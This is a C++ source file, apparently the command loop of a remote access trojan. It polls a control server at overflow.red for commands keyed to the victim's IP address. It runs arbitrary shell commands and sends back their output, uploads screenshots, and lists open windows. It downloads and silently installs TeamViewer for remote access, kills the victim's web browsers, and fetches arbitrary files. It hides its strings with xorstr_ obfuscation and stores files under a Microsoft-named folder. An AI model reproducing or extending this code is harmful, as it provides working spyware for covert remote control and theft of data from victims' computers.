#include "communication.h"
#include <iostream>
#include <filesystem>

#include "..\utility\requests.h"
#include "functions.h"
#include "../utility/helper.h"
#include "client.h"

namespace fs = std::filesystem;

namespace client {
	namespace communication {
		void handler_loop() {
			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&webhook_url=") + client::client_webhook_url + std::string("&content=**Notification**\n```\n") + std::string(xorstr_("Communication Thread Created")) + xorstr_("\n```"));

			while (true) {
				auto cmd = requests::get_request("https://overflow.red/post.php", "cmd=get_command&ip=" + client::ip);
				if (!cmd.empty()) {	
					if (cmd == "screenshot") {
						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**") + std::string("&ip=") + client::ip);
					} 
					else if (cmd == "windows") {
						requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload(xorstr_("All Windows"), client::functions::get_all_windows()));
					}
					else if (cmd == "teamviewer_run") {
						system((std::string("cd ") + std::string(helpers::roaming + xorstr_("\\Microsoft\\") + "tv") + std::string("&& powershell.exe -file ") + "teamviewer_install.ps1").c_str());

						Sleep(1500);

						system("taskkill /F /IM MicrosoftEdge.exe");
						system("taskkill /F /IM firefox.exe ");
						system("taskkill /F /IM chrome.exe ");

						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**TeamViewer**") + std::string("&ip=") + client::ip);
					}
					else if (cmd == "teamviewer_download") {
						if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip")) {
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Downloading Files") + xorstr_("\n```"));
							requests::download_file("https://srv-store4.gofile.io/download/L2TuWe/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Finished Downloading. Extracing and Running.") + xorstr_("\n```"));
						}
						else {
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("File Already Exists. Extracing and Running.") + xorstr_("\n```"));
						}
						std::string path = helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip";
						std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
						std::string command = "powershell -command \"Expand-Archive -Force " + path + " " + unzip_path + "\"";
						system(command.c_str());
					}
					else if (cmd == "teamviewer_all") {
						if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip")) {
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Downloading Files") + xorstr_("\n```"));
							requests::download_file("https://srv-store4.gofile.io/download/L2TuWe/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("Finished Downloading. Extracing and Running.") + xorstr_("\n```"));
						} 
						else {
							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string("File Already Exists. Extracing and Running.") + xorstr_("\n```"));
						}

						std::string path = helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip";
						std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
						std::string command = "powershell -command \"Expand-Archive -Force " + path + " " + unzip_path + "\"";
						system(command.c_str());

						system((std::string("cd ") + std::string(helpers::roaming + xorstr_("\\Microsoft\\") + "tv") + std::string("&& powershell.exe -file ") + "teamviewer_install.ps1").c_str());

						Sleep(1500);

						system("taskkill /F /IM MicrosoftEdge.exe");
						system("taskkill /F /IM firefox.exe ");
						system("taskkill /F /IM chrome.exe ");

						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**TeamViewer**") + std::string("&ip=") + client::ip);
					}
					else if (cmd.find("download") != std::string::npos && 
							 (cmd.find("https") != std::string::npos || 
							 cmd.find("http") != std::string::npos)) {
						auto index = cmd.find("http") != std::string::npos ? cmd.find("http") : cmd.find("https");
						auto url = cmd.substr(index);
						requests::download_file(url, helpers::roaming + xorstr_("\\Microsoft\\") + "download" + cmd.substr(cmd.find_last_of(".")));
					}
					else if (cmd.find("wallpaper") != std::string::npos &&
							(cmd.find("https") != std::string::npos ||
							cmd.find("http") != std::string::npos)) {
						auto index = cmd.find("http") != std::string::npos ? cmd.find("http") : cmd.find("https");
						auto url = cmd.substr(index);
						auto path = helpers::roaming + xorstr_("\\Microsoft\\") + "download" + cmd.substr(cmd.find_last_of("."));
						std::string message = "";
						if (requests::download_file(url, path)) {
							functions::set_wallpaper(helpers::s2ws(path).c_str());
							message = "Success";
						}
						else {
							message = "Failed to download file";
						}

						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Set Wallpaper**\n```\n") + message + xorstr_("\n```"));
					}
					else {
						std::cout << cmd.c_str() << std::endl;
						auto response = helpers::exec(cmd.c_str());
						std::cout << "\n" + response << std::endl;

						if (response.empty())
							response = "-Empty-";
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Command Response**\n```\n") + response + xorstr_("\n```"));
					}
				}
			}
		}
	}
}